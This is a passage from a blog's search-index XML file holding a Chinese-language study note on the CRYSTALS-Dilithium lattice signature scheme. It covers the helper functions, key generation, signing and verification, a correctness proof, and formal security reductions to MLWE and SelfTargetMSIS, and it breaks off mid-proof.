<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CRYSTALS-Dilithium</title>
      <link href="/2025/05/29/CRYSTALS-Dilithium/"/>
      <url>/2025/05/29/CRYSTALS-Dilithium/</url>
      
        <content type="html"><![CDATA[<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ol><li>论文：[CRYSTALS-Dilithium Algorithm Specifications and Supporting Documentation (Version 3.1)](<a href="https://pq-crystals.org/dilithium/data/dilithium-specification-round3-20210208.pdf">CRYSTALS-Dilithium (pq-crystals.org)</a>)</li><li><a href="https://mp.weixin.qq.com/s/A_4PwpCL0p3M1Z4D6lcTsQ">https://mp.weixin.qq.com/s/A_4PwpCL0p3M1Z4D6lcTsQ</a></li></ol><h1 id="困难问题"><a href="#困难问题" class="headerlink" title="困难问题"></a>困难问题</h1><ol><li>MSIS</li><li>SelfTargetMSIS</li><li>MLWE</li></ol><h1 id="数学符号"><a href="#数学符号" class="headerlink" title="数学符号"></a>数学符号</h1><ol><li><p><strong><code>:=</code></strong> 表示<strong>定义（define as）</strong>，用于明确表达某个符号或表达式的定义。</p></li><li><p><strong>形式化意义</strong>：<strong><code>:=</code></strong> 的左侧是要被定义的符号，右侧是该符号的具体定义。</p></li><li><p><strong>区别于等号（<code>=</code>）</strong>：普通等号 <code>=</code> 表示等值或相等，而 <strong><code>:=</code></strong> 强调这是一个新的定义或约定。</p></li><li><p>示例：$f(x) :&#x3D; x^2 + 1$表示$f(x)$被定义为$x^2 + 1$。</p></li></ol><h1 id="算法中调用的函数"><a href="#算法中调用的函数" class="headerlink" title="算法中调用的函数"></a>算法中调用的函数</h1><ol><li><p>$Power2Round_q(r, d)$:</p><ol><li>$r :&#x3D; r \mod^+ q$</li><li>$r_0 :&#x3D; r \mod 2^d$</li><li>$return\left( \frac{(r - r_0)}{2^d}, r_0 \right)$</li></ol></li><li><p>$MakeHint_q(z, r, \alpha)$ </p><ol><li>$r_1 :&#x3D; \text{HighBits}_q(r, \alpha)$</li><li>$v_1 :&#x3D; \text{HighBits}_q(r + z, \alpha)$ </li><li>$return[r_1 \neq v_1]$</li></ol></li><li><p>$UseHint_q(h, r, \alpha)$ </p><ol><li>$m :&#x3D; \frac{(q - 1)}{\alpha}$</li><li>$(r_1, r_0) :&#x3D; \text{Decompose}_q(r, \alpha)$</li><li>$If{h &#x3D; 1 \quad and \quad r_0 &gt; 0} \quad return \quad (r_1 + 1) \mod^+ m$ </li><li>$If{h &#x3D; 1 \quad and \quad r_0 \leq 0} \quad return \quad (r_1 - 1) \mod^+ m$ </li><li>$return \quad r_1$</li></ol></li><li><p>$Decompose_q(r, \alpha)$}</p><ol><li><p>$r :&#x3D; r \mod^+ q$</p></li><li><p>$r_0 :&#x3D; r \mod^{\pm} \alpha$ </p></li><li><p>$If{r - r_0 &#x3D; q - 1}$</p><ol><li>$r_1 :&#x3D; 0; r_0 :&#x3D; r_0 - 1$</li></ol></li><li><p>$Else  \quad r_1 :&#x3D; \frac{r - r_0}{\alpha}$(相当于$r_1 &#x3D; \lfloor \frac{r}{\alpha} \rfloor$)</p></li><li><p>$return (r_1, r_0)$</p></li></ol></li><li><p>$HighBits_q(r, \alpha)$</p><ol><li>$(r_1, r_0) :&#x3D; \text{Decompose}_q(r, \alpha)$</li><li>$return \quad r_1$</li></ol></li><li><p>$LowBits_q(r, \alpha)$</p><ol><li>$(r_1, r_0) :&#x3D; \text{Decompose}_q(r, \alpha)$</li><li>$return \quad r_0$</li></ol></li><li><p>$SampleInBall$(从签名中的压缩表示$ \tilde{c}$ 中还原出完整的多项式 $c$):</p><ol><li><p>$\tilde{c}$ 是 $c$ 的压缩形式，作为签名的一部分被发送。$c$ 是一个稀疏多项式，属于一个有限域（模 $q$的环），其系数仅为 −1、0、+1，并且满足固定的汉明重量（非零系数的个数是固定的）。$\tilde{c}$ 是一种编码，仅记录了 $c$中非零系数的位置和符号。函数 $SampleInBall$ 是从压缩的 $\tilde{c}$中重新构造稀疏多项式 $c$。</p></li><li><p>稀疏多项式$ c$的性质：$c$ 是一个 n次多项式（即维度为 n的向量）。其中有$ \tau$个系数是非零值（−1 或 +1），其他的系数是 0。$\tau$是协议中预先定义的固定参数。</p></li><li><p>压缩表示 $\tilde{c}$ ：$\tilde{c}$  记录了 $\tau$个非零值的位置信息以及它们的符号。一般使用一个紧凑的二进制编码格式表示，具体编码方式会因实现而异。</p></li><li><p>重构过程（SampleInBall）：根据 $\tilde{c}$ 中的编码信息，确定 $\tau$个非零值的位置。读取这些位置的符号（−1 或 +1）。构造一个多项式 $c$，其系数根据以上信息设置为 −1、+1，其他位置的系数置为 0。</p></li></ol></li></ol><h1 id="引理"><a href="#引理" class="headerlink" title="引理"></a>引理</h1><h2 id="引理1"><a href="#引理1" class="headerlink" title="引理1"></a>引理1</h2><p>假设 $q$和 $\alpha$是正整数，满足 $q&gt;2\alpha$，$q\equiv1 \pmod {\alpha}$且$\alpha$为偶数。设 $r $和$ z$是 $R_{q}$中的元素向量，其中 $|z|<em>{\infty}\leq\frac{\alpha}{2}$，并且 $h$，$h’$是比特向量。那么$ HighBits$，$MakeHint</em>{q}$和 $UseHint_{q}$算法满足以下性质。</p><h3 id="性质1"><a href="#性质1" class="headerlink" title="性质1"></a>性质1</h3><p>$UseHint_{q}(MakeHint_{q}(z,r,\alpha),r,\alpha)&#x3D;HighBits_{q}(r + z,\alpha)$</p><h3 id="性质2"><a href="#性质2" class="headerlink" title="性质2"></a>性质2</h3><p>令$ v_{1}&#x3D;UseHint_{q}(h,r,\alpha)$，则$ \left|r - v_{1}\cdot\alpha\right|<em>{\infty}\leq\alpha + 1$。此外，如果 $h$中 1的个数是 $\omega$，那么在以 $q$为模的中心约简后，$r - v</em>{1}\cdot\alpha$除了至多 $\omega$个系数外，其余系数的绝对值至多为$ \frac{\alpha}{2}$。 </p><h3 id="性质3"><a href="#性质3" class="headerlink" title="性质3"></a>性质3</h3><p>对于任意的$ h$，$h’$，如果 $UseHint_{q}(h,r,\alpha)&#x3D;UseHint_{q}(h’,r,\alpha)$，那么 h &#x3D; h’</p><h3 id="引理1的扩展"><a href="#引理1的扩展" class="headerlink" title="引理1的扩展"></a>引理1的扩展</h3><p>由引理1可以推出：$2\gamma_2 \cdot UseHint_q(h,Az-ct_1 \cdot2^d,2\gamma_2)&#x3D;Az-ct_1 \cdot 2^d$，其中$|u|_\infty \leq 2\gamma_2+1$。证明如下：</p><ol><li>$\gamma_2 &#x3D; \lceil \frac{q}{2^{d+1}} \rceil$；令$r&#x3D;Az-ct_1 \cdot 2^d$</li><li>由引理1的性质1：$UseHint_q(MakeHint_q(z, r, \alpha), r, \alpha) &#x3D; HighBits_q(r + z, \alpha)$可知当我们取$z&#x3D;u$和$\alpha&#x3D;2 \gamma_2$且$|u|_\infty \leq 2\gamma_2+1$时可以得到：$UseHint_q(MakeHint_q(u, r, 2 \gamma_2), r, 2 \gamma_2) &#x3D; HighBits_q(r + u, 2 \gamma_2)$</li><li>将$r&#x3D;Az-ct_1 \cdot 2^d$带入可以得到：$UseHint_q(MakeHint_q(u, Az - ct_1 \cdot 2^d, 2\gamma_2), Az - ct_1 \cdot 2^d, 2\gamma_2) &#x3D; HighBits_q(Az - ct_1 \cdot 2^d + u, 2\gamma_2)$</li><li>由引理1性质1，我们知道：$UseHint_q(h, Az - ct_1 \cdot 2^d, 2\gamma_2) &#x3D; HighBits_q(Az - ct_1 \cdot 2^d, 2\gamma_2)$，其中$h$是我们通过$MakeHint$生成的提示信息</li><li>由$HighBits_q$知$\alpha \cdot HighBits_q(x,\alpha) \approx x $，所以$2\gamma_2 \cdot HighBits_q(Az - ct_1 \cdot 2^d + u, 2\gamma_2) \approx Az - ct_1 \cdot 2^d + u$</li><li>4同时乘$2\gamma_2$并将5带入4中可以得到：$2\gamma_2 \cdot UseHint_q(h,Az-ct_1 \cdot2^d,2\gamma_2)&#x3D;Az-ct_1 \cdot 2^d + u$</li></ol><h2 id="引理2"><a href="#引理2" class="headerlink" title="引理2"></a>引理2</h2><p>如果$|s|<em>\infty \leq \beta$且$|LowBits_q(r,\alpha)|</em>\infty &lt; \frac{\alpha}{2}-\beta$，则$HighBits_q(r, \alpha) &#x3D; HighBits_q(r + s, \alpha)$</p><h2 id="引理3"><a href="#引理3" class="headerlink" title="引理3"></a>引理3</h2><p>当满足$(r_1, r_0) &#x3D; Decompose_q(r, \alpha), (w_1, w_0) &#x3D; Decompose_q(r + s, \alpha), |s|<em>\infty \leq \beta$时，有：$|s + r_0|</em>\infty &lt; \frac{\alpha}{2} - \beta \iff w_1 &#x3D; r_1 \land |w_0|_\infty &lt; \frac{\alpha}{2} - \beta$</p><h1 id="公开参数"><a href="#公开参数" class="headerlink" title="公开参数"></a>公开参数</h1><ol><li>XOF算法，原文采用了SHAKE256, 也可以换成其他的</li><li>多项式环：$R_q &#x3D; \mathbb{Z}_q[X]&#x2F;(X^{256} + 1)$，这里$q &#x3D; 2 ^{23} - 2 ^{13} + 1 &#x3D; 8380417$。环中的元素是模$q$的多项式，且每个多项式的最高次数为 255</li><li>$l \times k$: 公开的矩阵的大小，本文演示代码采用$4 \times 4$的矩阵，其他大小可以参考原始公开的文档</li><li>$d$: $t$丢弃的bit的长度</li><li>$\eta$: 私钥的系数的范围</li><li>$\gamma_1$: $y$的系数的范围</li><li>$\gamma_2$: low-order 的裁剪范围</li></ol><h1 id="密钥生成算法"><a href="#密钥生成算法" class="headerlink" title="密钥生成算法"></a>密钥生成算法</h1><ol><li><p>生成一个种子</p><ol><li>$\zeta \leftarrow {0,1}^{256}$，首先生成一个256bit的随机值，这个随机值呢，其实是不参与后面的交换过程的，只是为了生成后面的随机种子（$\rho, \rho’, K$）</li><li>采用的伪随机数算法采用基于哈希的伪随机数生成算法SHAKE-256或AES算法（理论上是可以换的），利用$H$函数分别生成$(\rho, \rho’, K) \in {0,1}^{256} \times {0,1}^{512} \times {0,1}^{256} :&#x3D; H(\zeta)$。即通过伪随机数生成算法将初始随机值$\zeta$通过哈希函数$H$转换为三个伪随机值$\rho、 \rho’、 K$<ol><li>$\rho \in {0,1}^{256}$是用于生成随机矩阵$A$的种子</li><li>$\rho’  \in {0,1}^{512}$和$K  \in {0,1}^{256}$在后续用于私钥和公钥的生成</li></ol></li></ol></li><li><p>通过这三个初始值可以用来生成密钥</p><ol><li>生成随机矩阵$A$：$A \in \mathbb{R}^{k \times l}_q :&#x3D; \text{ExpandA}(\rho)$，其中$A$ 是一个$ k×l$ 矩阵，元素属于有限域 $\mathbb{R}_q$。（这一步可以通过NTT算法优化加速）<ol><li>使用种子派生矩阵的原因：如果直接传输一个矩阵 $A$，它的传输数据量会非常庞大，特别是在密钥生成、签名或加密等步骤中，矩阵的大小可能会达到数百字节甚至更大。如果一个矩阵的大小非常大，这会在传输、存储和计算效率上带来显著的开销。而种子派生矩阵可以只传输256比特的种子，传输内容就极大的减小了。</li><li>派生矩阵的过程：为了减小传输内容的大小，算法采用了 种子$\rho$来派生出一个矩阵$A$。虽然种子本身只有 256 位（32 字节），但通过派生过程，可以从这个种子中获得一个非常大的矩阵或其他多项式结构</li><li>为什么通过派生可以减小传输内容：通过使用一个较小的种子值，并通过算法生成矩阵 $A$，可以保持信息的完整性，同时显著减小需要传输的数据量。种子只是一个固定长度的值（例如 256 位），而矩阵本身可能有成千上万的位数，但通过数学操作（如伪随机生成），可以从一个较小的种子生成矩阵，且接收方可以根据相同的算法来复原该矩阵。</li></ol></li><li>计算私钥<ol><li>：$(s_1, s_2) \in S_\eta^{\ell} \times S_\eta^k :&#x3D; \text{ExpandS}(\rho’)$<ol><li>这里$S_\eta$表示系数范围在$\eta$之内，这里私钥是一个系数较小的值。</li><li>$\ell$和 $k$是参数，决定了 $s_1, s_2$的维度。</li><li>$\text{ExpandS}(\rho’)$表示通过种子 $\rho’$ 和某种伪随机生成算法扩展得到这些值。</li></ol></li><li>$t :&#x3D; A s_1 + s_2$</li><li>$(t_1, t_0) :&#x3D; \text{Power2Round}_q(t, d)$，$\text{Power2Round}_q$是一个特殊的分解函数，将$t$分解为两个部分$t_1$和$t_0$，其中$t_1$是高位部分，$t_0$是低位部分。</li><li>计算一个值$\text{tr} \in {0,1}^{256} :&#x3D; H(\rho | t_1)$。这里，其实在签名的时候，再来计算也可以，就是私钥里面也放一下$t_1$就好了。</li><li>得到对应的私钥$\text{sk} &#x3D; (\rho, K, \text{tr}, s_1, s_2, t_0)$</li></ol></li><li>计算公钥：$\text{pk} &#x3D; (\rho, t_1)$（这里的$t_1$即前面计算私钥时的$t_1$）。公钥$\text{pk}$仅包含种子$\rho$和分解后的高位部分$t_1$，体积小且便于传输。</li><li>流程：<ol><li>生成一个随机种子，通过种子生成3个分别为256和512为的随机值</li><li>通过256位随机值生成派生矩阵A</li><li>通过扩展算法计算一个512位的随机值得到私钥的一部分，再以此计算出t，并保存t的低位作为私钥的一部分，对t的高位做处理后同样作为私钥的一部分</li><li>将前面生成随机矩阵A的256位随机值和t的高位作为公钥</li></ol></li></ol></li></ol><h1 id="签名算法"><a href="#签名算法" class="headerlink" title="签名算法"></a>签名算法</h1><ol><li>首先根据$\rho$来恢复矩阵$A$：$\mathbf{A} \in \mathbb{R}^{k \times l}_q :&#x3D; \text{ExpandA}(\rho)$</li><li>计算一个hash值：$\mu \in {0, 1}^{512} :&#x3D; H(tr \parallel M)$，消息$M$</li><li>生成一个随机值$\rho’$，这里可以采用$H$派生$\rho’ \in {0, 1}^{512} :&#x3D; H(K \parallel \mu)$，也可以随机取值$\rho’ \in {0, 1}^{512}$（和生成密钥中的$\rho’$有区别）</li><li>初始化变量：计数器$\kappa&#x3D;0$</li><li>进入循环，判断条件：$(z, h) :&#x3D;\perp$<ol><li>随机生成y的值：$y \in S_{\gamma_1}^{l} :&#x3D; \text{ExpandMask}(\rho’, \kappa)$，其中$y$的系数范围是通过$\gamma_1$来决定的</li><li>计算：$w :&#x3D; A y$</li><li>读取$w$的高位：$w_1 :&#x3D; \text{HighBits}_{\gamma_2}(w, 2\gamma_2)$</li><li>计算一个倍数值，并将其转换成一个多项式：$\tilde{c} \in {0,1}^{256} :&#x3D; H(\mu | w_1)，c \in B_{\tau} :&#x3D; \text{SampleInBall}(\tilde{c})$</li><li>计算：$z :&#x3D; y + c s_1，r_0 :&#x3D; \text{LowBits}_{\gamma_2}(w - c s_2, 2\gamma_2)$</li><li>这里需要判断$z$和$r_0$的范数，是否在范围之内。当$||z||<em>{\infty} \geq \gamma_1 - \beta \quad or \quad ||r_0||</em>{\infty} \geq \gamma_2 - \beta$时，$(z, h) :&#x3D;\perp$并跳转到5.8</li><li>当$z$和$r_0$的范数不满足5.6中的条件时，计算$h$的值，$h :&#x3D; \text{MakeHint}_{q}(-c t_0, w - c s_2 + c t_0, 2\gamma_2) $<ol><li>当$||c t_0||_{\infty} \geq \gamma_2 $或$h$的汉明重量大于$w$时，$(z, h) :&#x3D;\perp$并跳转到5.8</li><li>当不满足上面5.7.1的条件时，$k&#x3D;k+1，\sigma &#x3D; (\tilde{c}, z, h)$并<strong>退出循环</strong>（<strong>此时满足的条件：</strong>$||z||<em>{\infty} &lt; \gamma_1 - \beta$ 、$||r_0||</em>{\infty} &lt; \gamma_2 - \beta$、$||c t_0||_{\infty} &lt; \gamma_2$ 以及 $h$的汉明重量小于$w$），返回$\sigma &#x3D; (\tilde{c}, z, h)$作为最终签名内容</li></ol></li><li>$k&#x3D;k+1$，并跳转到5.1符合判断条件后继续循环。<ol><li>在这里$k$的作用主要是用来控制循环的次数，它并不直接影响签名的计算方式。计数器的步长变化主要影响的是算法的执行效率，而不是安全性。实现者可以根据实际情况调整步长，所以在一些关于CRYSTALS-Dilithium算法讲解的网页中步长可能不是1而是其他数值（如$\ell$等）</li></ol></li></ol></li><li>签名结果：$\sigma &#x3D; (\tilde{c}, z, h)$</li><li>流程：<ol><li>通过私钥中的的值恢复随机矩阵A</li><li>计算消息的hash值</li><li>进入循环计算，直到找到符合条件的值</li></ol></li></ol><h1 id="验签算法"><a href="#验签算法" class="headerlink" title="验签算法"></a>验签算法</h1><ol><li>首先，判断$h、z$的范围（$|z|_\infty&lt;\gamma_1-\beta$并且$h$的汉明重量小于$w$），是不是合理，不合理，直接返回验签失败</li><li>首先根据$\rho$来恢复矩阵$\mathbf{A}$：$\mathbf{A} \in \mathbb{R}^{k \times l}_q :&#x3D; \text{ExpandA}(\rho)$</li><li>计算$\mu$的值，这里和私钥计算的值是一样的$\mu \in {0, 1}^{512} :&#x3D; H(tr \parallel M)$</li><li>恢复$c$的值，得到一个多项式$c:&#x3D;SampleInBall(\tilde{c})$</li><li>计算$w_1’ :&#x3D; \text{UseHint}_q(h, \mathbf{A}z - ct_1 \cdot 2^d, 2\gamma_2)$</li><li>验签$\tilde{c} &#x3D; H(\mu | w_1’)$，计算$\tilde{c}$和传输过来的是否一致，如果一致，验签成功，否则，验签失败。</li><li>流程：<ol><li>通过公钥中值恢复随机矩阵$\mathbf{A}$</li><li>计算消息的hash值</li><li>计算对比值是否正确</li></ol></li></ol><h1 id="签名原理（正确性证明）"><a href="#签名原理（正确性证明）" class="headerlink" title="签名原理（正确性证明）"></a>签名原理（正确性证明）</h1><ol><li>签名时：$w_1&#x3D; \text{HighBits}_{\gamma_2}(w, 2\gamma_2),\tilde{c}&#x3D; H(\mu | w_1)$</li><li>验签时：$w_1’ :&#x3D; UseHint_q(h, \mathbf{A}z - ct_1 \cdot 2^d, 2\gamma_2)，\tilde{c} &#x3D; H(\mu | w_1’)$，计算$\tilde{c}$和传输过来的是否一致，如果一致，验签成功，否则，验签失败。</li><li>所以只用证明$w_1 &#x3D; w_1’$即可完成正确性证明</li></ol><h2 id="正确性证明"><a href="#正确性证明" class="headerlink" title="正确性证明"></a>正确性证明</h2><ol><li>令$h :&#x3D; \text{MakeHint}<em>{q}(-c t_0, w - c s_2 + c t_0, 2\gamma_2) $，$z&#x3D;-ct_0, r&#x3D;w-cs_2+ct_0，\alpha &#x3D; 2\gamma_2$带入<strong>引理1</strong>$UseHint</em>{q}(MakeHint_{q}(z,r,\alpha),r,\alpha)&#x3D;HighBits_{q}(r + z,\alpha)$，其中满足$|z|<em>\infty \leq \frac{\alpha}{2}$即$|ct_0|</em>\infty &lt;\gamma_2$所以有$UseHint_q(h,w-cs_2+ct_0,2\gamma_2) &#x3D; HighBits_q(w-cs_2,2\gamma_2)$</li><li>因为$w&#x3D;\mathbf{A}y$ and $t&#x3D;\mathbf{A}s_1+s_2$，所以$w - cs_2 &#x3D; \mathbf{A}y-cs_2&#x3D;\mathbf{A}(z-cs_1)-cs_2&#x3D;\mathbf{A}z-ct$</li><li>因为$(t_1, t_0) :&#x3D; \text{Power2Round}_q(t, d)$，所以有$ct &#x3D; c(t_1 \cdot 2^d + t_0)&#x3D;ct_1 \cdot 2^d + ct_0$。所以$w-cs_2 + ct_0 &#x3D; \mathbf{A}z-ct + ct_0 &#x3D; \mathbf{A}z - ct_1 \cdot 2^d$，所以有$UseHint_q(h,w-cs_2+ct_0,2\gamma_2) &#x3D; UseHint_q(h,\mathbf{A}z - ct_1 \cdot 2^d,2\gamma_2)&#x3D;HighBits_q(w-cs_2,2\gamma_2) $</li><li>因为$|cs_2|<em>\infty \leq \beta$且$|LowBits_q(w-cs_2,2\gamma_2)|</em>\infty &lt; \gamma_2-\beta$，所以由<strong>引理2</strong>得$HighBits_q(w-cs_2,2\gamma_2) &#x3D; HighBits_q(w-cs_2+cs_2,2\gamma_2)&#x3D;HighBits_q(w,2\gamma_2)&#x3D;w_1$</li><li>所以$w_1’ &#x3D; UseHint_q(h, \mathbf{A}z - ct_1 \cdot 2^d, 2\gamma_2)&#x3D;HighBits_q(w,2\gamma_2)&#x3D;w_1$，证毕</li></ol><h1 id="形式化安全分析（安全规约）"><a href="#形式化安全分析（安全规约）" class="headerlink" title="形式化安全分析（安全规约）"></a>形式化安全分析（安全规约）</h1><p>遵循 <strong>挑战者-攻击者模型</strong> 和 <strong>随机预言模型（ROM）</strong>，并规约到相关的数学困难问题（如 MLWE 、SelfTargetMSIS和 MSIS）。</p><h2 id="1-密钥恢复（Key-Recovery）的形式化安全分析"><a href="#1-密钥恢复（Key-Recovery）的形式化安全分析" class="headerlink" title="1. 密钥恢复（Key Recovery）的形式化安全分析"></a><strong>1. 密钥恢复（Key Recovery）的形式化安全分析</strong></h2><h3 id="安全目标"><a href="#安全目标" class="headerlink" title="安全目标"></a><strong>安全目标</strong></h3><p>攻击者不能从公钥 $(A,t)$中恢复私钥$ (s_1, s_2)$。</p><h3 id="攻击模型"><a href="#攻击模型" class="headerlink" title="攻击模型"></a><strong>攻击模型</strong></h3><p>攻击者$\mathcal{A}$被赋予如下能力：</p><ul><li>知道公钥$ t &#x3D; \mathbf{A} \cdot s_1 + s_2$；</li><li>知道系统参数$\mathbf{A}$和签名算法的实现；</li><li>攻击目标是从 $(\mathbf{A}, t)$中恢复$s_1, s_2$。</li></ul><h3 id="安全性定义"><a href="#安全性定义" class="headerlink" title="安全性定义"></a><strong>安全性定义</strong></h3><ol><li><p>CRYSTALS-Dilithium 的密钥恢复安全性规约到 <strong>模块化学习同余问题（MLWE）</strong>。</p></li><li><p>**MLWE 问题：**给定$ \mathbf{A} \in R_q^{m \times k}$和 $t \in R_q^m$，区分以下两种分布：</p></li><li><p>$t &#x3D; \mathbf{A} \cdot s_1 + s_2$，其中 $s_1, s_2$ 是从高斯分布中独立采样的短向量；</p></li><li><p>$t$是从均匀分布中随机生成的。</p></li></ol><p>如果攻击者能够破解密钥恢复问题，则可以有效地区分上述两种分布。</p><h3 id="形式化证明"><a href="#形式化证明" class="headerlink" title="形式化证明"></a><strong>形式化证明</strong></h3><ol><li><strong>挑战设置：</strong><br>挑战者 $\mathcal{C} $初始化系统参数：<ul><li>生成 $\mathbf{A}$ 和 $t$，满足 $t &#x3D; \mathbf{A} \cdot s_1 + s_2$，其中$s_1, s_2$是短向量。</li><li>将$(\mathbf{A}, t)$提供给攻击者 $\mathcal{A}$。</li></ul></li><li><strong>攻击者能力：</strong><br>$\mathcal{A}$接收$(\mathbf{A}, t)$并尝试恢复$s_1, s_2$</li><li>**规约到 MLWE：**如果攻击者$\mathcal{A}$能够成功恢复私钥$sk$，那么说明攻击者$\mathcal{A}$能够识别出$t$是从均匀分布中随机生成的还是$t &#x3D; \mathbf{A} \cdot s_1 + s_2$（其中$s_1$,$s_2$是从高斯分布中独立采样的短向量）并从$t &#x3D; \mathbf{A} \cdot s_1 + s_2$中成功恢复$s_1$,$s_2$，这证明攻击者$\mathcal{A}$能够高效破解MLWE问题，与MLWE问题的计算困难性假设矛盾，所以证明定理1。同时因为MLWE问题的困难性，公钥$pk&#x3D;(A,t)$中的$t$和从均匀分布中随机生成的$t$没有区别。</li><li><strong>归谬证明：</strong><br>假设存在一个攻击者能够破解密钥恢复问题，则他能够高效破解 MLWE 问题。这与 MLWE 的计算困难性假设矛盾。</li></ol><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a><strong>结论</strong></h3><p>密钥恢复的安全性直接规约到 MLWE 的困难性。</p><hr><h2 id="2-新消息伪造（UF-CMA）的形式化安全分析"><a href="#2-新消息伪造（UF-CMA）的形式化安全分析" class="headerlink" title="2. 新消息伪造（UF-CMA）的形式化安全分析"></a><strong>2. 新消息伪造（UF-CMA）的形式化安全分析</strong></h2><h3 id="安全目标-1"><a href="#安全目标-1" class="headerlink" title="安全目标"></a><strong>安全目标</strong></h3><p>攻击者不能在选定消息攻击（CMA）模型下伪造未签名消息$M’$的有效签名$\sigma’$。</p><p>由文献[1]中6.2.1的论证可知，对于零知识确定性签名方案，如果攻击者能够利用量子访问哈希函数$H$和经典访问签名Oracle的能力在UF-CMA模型下伪造一个新的消息签名，那么实际上可以通过构造一个不需要访问签名Oracle的攻击者在UF-NMA模型下完成伪造新的消息签名。因此，基于CRYSTALS-Dilithium签名算法的数学特性以及文献[1]提出的归约方法以及确定性签名方案的特性，可以通过模拟签名Oracle的行为实现从UF-CMA到UF-NMA的安全性归约。所以当证明CRYSTALS-Dilithium签名算法在UF-NMA模型下是安全的，即可推出其在UF-CMA模型下的安全性。下面证明CRYSTALS-Dilithium签名算法在UF-NMA模型下的安全性：</p><p>[1]CRYSTALS-Dilithium Algorithm Specifications and Supporting Documentation(Version 3.1)</p><h3 id="攻击模型-1"><a href="#攻击模型-1" class="headerlink" title="攻击模型"></a><strong>攻击模型</strong></h3><ol><li>攻击者$ \mathcal{A} $被赋予如下能力：<ol><li>查询公钥接口</li><li><strong>伪造目标</strong> ：输出一个未签名消息$ M’ $和有效签名 $\sigma’ &#x3D; (z’, h’, c’)$</li></ol></li><li>攻击者的目标是生成一个有效签名，使得验证者认为签名有效，且消息 $M’$没有在之前的签名查询中请求过。</li></ol><h3 id="安全性定义-1"><a href="#安全性定义-1" class="headerlink" title="安全性定义"></a><strong>安全性定义</strong></h3><ol><li>CRYSTALS-Dilithium 的新消息伪造安全性规约到 <strong>自目标模块化短整数解问题（SelfTargetMSIS）</strong>。</li><li>**SelfTargetMSIS 问题：**给定矩阵$ A $和哈希函数$ H$，找到一个向量 $y &#x3D; [z, c, u]$，满足：$[I \ | \mathbf{A}] \cdot y &#x3D; t’$,其中 $|y|_\infty \leq \gamma$，且 $t’$满足签名验证公式的约束。</li></ol><h3 id="形式化证明-1"><a href="#形式化证明-1" class="headerlink" title="形式化证明"></a><strong>形式化证明</strong></h3><ol><li><strong>挑战设置：</strong><ol><li><p>初始化：挑战者 $\mathcal{C}$执行以下步骤：</p><ol><li>随机生成系统参数，包括公钥矩阵$\mathbf{A}$、私钥$(s_1, s_2)$，以及哈希函数 $H$</li><li>计算公钥$(\mathbf{A}, t&#x3D;As_1+s_2)$</li><li>向攻击者$\mathcal{A}$提供公钥$(\mathbf{A},t)$</li></ol></li><li><p>签名验证公式可化简为： $H(\mu|UseHint(h, \mathbf{A}z - ct_1 \cdot 2^d, 2\gamma_2)) &#x3D; c$，其中：</p><ol><li>$\mu$是消息$M$的消息摘要：$\mu &#x3D;Hash(Hash(\rho ||t_{high})||M)$</li><li>$h$是生成的提示信息</li><li>$t_1$是公钥$t$的高位部分</li></ol></li></ol></li><li>公钥查询接口<ol><li>将攻击者查询的公钥提供给攻击者</li></ol></li><li><strong>攻击者伪造签名的条件</strong><ol><li>攻击者$ \mathcal{A} $成功伪造签名$ \sigma’ &#x3D; (z’, h’, c’) $的条件是：<ol><li>签名验证公式成立：$H(\mu’ | UseHint_q(h’, \mathbf{A}z’ - c’t_1 \cdot 2^d, 2\gamma_2)) &#x3D; c’$</li><li>消息$ M’ $没有在签名查询中被请求过。</li></ol></li></ol></li><li><strong>将伪造的签名规约到 SelfTargetMSIS：</strong><ol><li>由引理1可以得到：$2\gamma_2 \cdot UseHint_q(h,\mathbf{A}z-ct_1 \cdot2^d,2\gamma_2)&#x3D;\mathbf{A}z-ct_1 \cdot 2^d +u&#x3D;&gt;UseHint_q(h,\mathbf{A}z-ct_1 \cdot2^d,2\gamma_2)&#x3D;\frac{1}{2\gamma_2}\cdot(\mathbf{A}z-ct_1 \cdot 2^d + u)$</li><li>我们令$t&#x3D;t_1 \cdot 2^d+ t_0$，其中$|t_0|<em>\infty\leq2^{d-1}$。可以得到：$\mathbf{A}z - ct</em>{1} \cdot 2^{d} + u &#x3D; \mathbf{A}z - c(t - t_{0}) + u &#x3D; \mathbf{A}z - ct + (ct_{0} + u) &#x3D; \mathbf{A}z - ct + u’$</li><li>我们可以得到$u’$最坏情况下的上限$|u’|<em>{\infty} \leq |ct</em>{0}|<em>{\infty} + |u|</em>{\infty} \leq |c|<em>{1} \cdot |t</em>{0}|<em>{\infty} + |u|</em>{\infty} \leq \tau \cdot 2^{d - 1} + 2\gamma_{2} + 1$</li><li>因此敌手$\mathcal{A}$如果能够成功伪造签名信息$ \sigma’ &#x3D; (z’, h’, c’) $，就能找到$z’,c’,u’,M$满足$|z’|<em>{\infty}&lt;\gamma</em>{1}-\beta,|c’|<em>{\infty}&#x3D;1,|u’|</em>{\infty}\leq\tau\cdot2^{d - 1}+2\gamma_{2}+1$, $H(\mu’ | UseHint_q(h’, \mathbf{A}z’ - c’t_1 \cdot 2^d, 2\gamma_2)) &#x3D; c’$,以及 $h$的汉明重量小于$w$）由此可以得到：$H(\mu|UseHint_q(h’, \mathbf{A}z’ - c’t_1 \cdot 2^d, 2\gamma_2)) &#x3D; H\left(\mu \left|\frac{1}{2\gamma_{2}}\cdot\left[\mathbf{A}|t|I_{k}\right]\cdot\left[\begin{array}{c}z’\c’\u’\end{array}\right]\right.\right)&#x3D;c$</li><li>为了简化公式，我们定义函数$H’$满足$H(\mu |x)&#x3D;H’(\mu|2\gamma_2x)$，得到：$H’\left(\mu \left|\left[\mathbf{A}|t|I_{k}\right]\cdot\left[\begin{array}{c}z’\c’\u’\end{array}\right]\right.\right)&#x3D;c$</li><li>令$t’&#x3D; \mathbf{A}z’-c’t+u’$，则有$\left[\mathbf{A}|t|I_{k}\right]\cdot\left[\begin{array}{c}z’\c’\u’\end{array}\right]&#x3D;t’$，即存在一个短向量$y’ &#x3D; \left[\begin{array}{c}z’\c’\u’\end{array}\right]$，满足：$[I \ | \mathbf{A}] \cdot y’ &#x3D; t’$，其中 $|y’|_\infty \leq \gamma$。</li><li>这正是 <strong>SelfTargetMSIS 问题</strong> 的定义：在给定矩阵$[I ∣A] $和目标值 $t’$的情况下，找到一个短向量 $y &#x3D; \left[\begin{array}{c}z’\c’\u’\end{array}\right]$，满足：$[I \ | \mathbf{A}] \cdot y &#x3D; t’$，其中 $|y|_\infty \leq \gamma$。</li></ol></li><li>**归谬证明：**如果攻击者$ 